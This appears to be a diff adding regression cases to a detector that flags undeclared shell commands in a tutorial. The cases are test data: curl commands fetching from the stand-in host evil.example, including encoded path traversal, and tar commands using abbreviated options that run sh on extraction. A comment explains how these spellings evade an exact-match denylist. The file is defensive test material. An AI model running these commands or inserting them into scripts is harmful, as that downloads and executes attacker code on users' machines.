@@ -394,6 +394,50 @@ REGRESSION_CASES = [
     ('tar with its own decompressor program is undeclared',
      'tar -I ./evil -xf x.tar',
      ['tar -I ./evil -xf x.tar']),
+    # The verifier's spellings on PR #1128. curl fetches an operand with no
+    # scheme, and GNU tar accepts any unambiguous prefix of a long option and
+    # reads its first operand as old-style options, so a denylist of exact
+    # names and of `://` tokens held none of these.
+    ('curl with a second operand that names no scheme is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/x.tar.gz evil.example/x.sh',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/x.tar.gz evil.example/x.sh']),
+    ('curl --next with a second transfer is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/x.tar.gz --next -O evil.example/x.sh',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/x.tar.gz --next -O evil.example/x.sh']),
+    ('curl expanding a variable into a URL is undeclared',
+     'curl --variable u=evil.example/p --expand-url {{u}} '
+     'https://github.com/headwater-ai/headwater/releases/download/v0.2.1/x.tar.gz',
+     ['curl --variable u=evil.example/p --expand-url {{u}} '
+      'https://github.com/headwater-ai/headwater/releases/download/v0.2.1/x.tar.gz']),
+    ('curl climbing out with an encoded dot segment is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     '%2e%2e/%2e%2e/evil/x.sh',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      '%2e%2e/%2e%2e/evil/x.sh']),
+    ('curl with a URL glob is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/{x.tar.gz,y}',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/{x.tar.gz,y}']),
+    ('tar with an abbreviated --to-command is undeclared',
+     'tar --to-comm=sh -xzf x.tar.gz',
+     ['tar --to-comm=sh -xzf x.tar.gz']),
+    ('tar with an abbreviated --checkpoint-action is undeclared',
+     'tar -xzf x.tar.gz --checkpoint=1 --checkpoint-act=exec=sh',
+     ['tar -xzf x.tar.gz --checkpoint=1 --checkpoint-act=exec=sh']),
+    ('tar with an abbreviated --use-compress-program is undeclared',
+     'tar --use-compress-prog=sh -xf x.tar.gz',
+     ['tar --use-compress-prog=sh -xf x.tar.gz']),
+    ('tar with old-style options in its first operand is undeclared',
+     'tar xIf sh a.tar.gz',
+     ['tar xIf sh a.tar.gz']),
+    ('tar with an option cluster outside the one the tutorial runs is undeclared',
+     'tar -xzvf x.tar.gz -K member',
+     ['tar -xzvf x.tar.gz -K member']),
     ('step 1 scaffolding is not undeclared',
      'mkdir -p ~/headwater-tutorial/docs/decisions\n'
      'cd ~/headwater-tutorial\n'
